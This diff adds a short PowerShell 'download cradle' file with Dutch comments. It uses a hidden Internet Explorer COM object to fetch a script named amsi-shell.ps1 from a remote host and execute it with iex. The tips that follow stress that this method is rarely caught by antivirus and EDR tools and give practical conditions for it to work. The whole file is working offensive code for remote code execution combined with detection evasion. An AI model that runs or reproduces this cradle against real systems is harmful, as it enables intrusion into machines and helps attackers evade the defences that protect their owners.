@@ -1,0 +1,7 @@
+# PowerShell Download Cradle - Internet Explorer COM Object
+# Gebruikt IE COM object voor download (ongebruikelijk, minder gedetecteerd)
+$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://10.0.0.1/payloads/amsi-shell.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
+# Tip: Vereist dat IE geinstalleerd is (niet beschikbaar op Server Core)
+# Tip: Sleep 5 is nodig om pagina te laden - verhoog bij trage verbinding
+# Tip: Minst gedetecteerd door AV/EDR omdat IE COM zelden voor downloads gebruikt wordt
+# Tip: Werkt niet op Windows 11+ (IE verwijderd)
